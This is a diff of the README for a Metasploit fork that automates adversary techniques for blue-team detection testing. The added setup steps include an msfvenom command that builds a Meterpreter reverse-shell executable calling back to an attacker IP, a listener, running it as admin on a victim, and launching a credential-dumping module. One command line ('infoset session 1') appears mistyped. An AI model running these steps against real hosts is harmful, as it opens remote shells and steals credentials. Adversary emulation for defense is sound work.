@@ -3,9 +3,11 @@ Metasploit [![Build Status](https://travis-ci.org/rapid7/metasploit-framework.sv
 The Metasploit Framework is released under a BSD-style license. See
 [COPYING](COPYING) for more details.
 
-At Praetorian, we were seeking a way to automatically emulate adversary tactics in order to evaluate Detection and Response capabilities. While there are already a number of other automated tools in this space, we weren't satisfied with the flexibility of these frameworks. Hence, we chose to implement a number of these TTPs as Metasploit Framework `post` modules. As of this release, we've implemented a little over 100 TTPs as modules. Metasploit's advantage is its robust library, capability to interact with operating system APIs, and its flexible license. In addition, we're able to emulate the features of other tools such as in-memory .NET execution via leveraging Metasploit's `execute_powershell` functionality. This allows Blue Teams to ensure that their tools are alerting on the actual TTP behavior and not execution artifacts (such as encoded PowerShell).
+At Praetorian, we were seeking a way to automatically emulate adversary tactics in order to evaluate detection and response capabilities. Our solution implements MITRE ATT&CK&trade; TTPs as Metasploit Framework `post` modules. As of this release, we've automated a little over 100 TTPs as modules.
 
-This is a fork of the the latest version of Metasploit (as of 09Apr2019) pulled from: https://github.com/rapid7/metasploit-framework
+Metasploit's advantage is its robust library, capability to interact with operating system APIs, and its flexible license. In addition, we're able to emulate the features of other tools such as in-memory .NET execution via leveraging Metasploit's `execute_powershell` functionality. This allows Blue Teams to ensure that their tools are alerting on the actual TTP behavior and not execution artifacts (such as encoded PowerShell).
+
+Our solution is built on top of the latest version of Metasploit as of 09Apr2019 (pulled from: https://github.com/rapid7/metasploit-framework). We’ve made minor modifications to Metasploit’s code base to enable some of the automation. Everything should work as intended if you’re already familiar with Metasploit. The magic happens after you establish a Meterpreter session and run a TTP as a post-exploitation module.
 
 We're open sourcing our work because we believe in solving the cybersecurity problem. By giving Blue Teams more tools to emulate adversary behavior, we hope to improve their capabilities and reduce the still very high average dwell time.
 
@@ -19,9 +21,9 @@ Installation should follow the instructions for installing a Metasploit Docker e
 https://github.com/rapid7/metasploit-framework/tree/master/docker
 
 In general:
- - Install Docker
- - `git clone https://github.com/praetorian-inc/purple-team-attack-automation.git`
- - Edit `./docker-compose.local.override.yml` to reflect the LHOST of your local system similar to below.
+ * Install Docker
+ * `git clone https://github.com/praetorian-inc/purple-team-attack-automation.git`
+ * Edit `./docker-compose.local.override.yml` to reflect the LHOST of your local system similar to below. By default, port 4444 will be forwarded to the docker container. If you want to use other ports, for instance to mirror HTTPS, you'll have to add them to this file.
 
 ```
 version: '3'
@@ -36,9 +38,28 @@ services:
       - 443:443
 ```
 
- - Add / Remove further ports or IP addresses as you see fit. Don't forget to change the LHOST to your own IP address.
- - `docker-compose build`
- - Start the container with `./docker/bin/msfconsole`
+ * Add / Remove further ports or IP addresses as you see fit. Don't forget to change the LHOST to your own IP address.
+ * `docker-compose build`
+ * Start the container with `./docker/bin/msfconsole`
+ *	Generate a Meterpreter payload:
+ ```
+ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker IP Address> LPORT=4444 -f exe > meterpreter.exe
+ ```
+ *	Start and run a local listener: 
+ ```
+  use exploit/multi/handler
+  set PAYLOAD windows/meterpreter/reverse_tcp
+  set LHOST <Attacker IP Address>
+  set LPORT 4444
+  exploit -j -z
+  ```
+  Copy and run meterpreter.exe on the target (“victim”) host as admin and wait for a session.
+*	Run a TTP as a post-exploitation module. The list of modules is provided below. For example, to start the 'Credential Dumping (T1003)’ module, run:  
+```
+use modules/post/windows/purple/t1003.rb
+infoset session 1
+run
+```
 
 ### Meterpreter Payloads
 
